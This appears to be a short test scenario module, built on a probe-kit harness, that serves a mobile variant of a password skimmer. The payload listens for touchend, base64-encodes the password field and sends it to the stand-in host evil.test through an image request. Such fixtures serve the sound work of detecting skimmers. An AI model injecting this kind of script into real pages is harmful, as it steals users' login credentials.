// The same skimmer listening for touchend, as on phones.
import { scenario } from './probe-kit.js';

export const respond = scenario((ctx) => `document.getElementById('go').addEventListener('touchend', function () {
  new Image().src = '${ctx.origin('evil.test')}/t?d=' + btoa(document.getElementById('password').value);
});`);
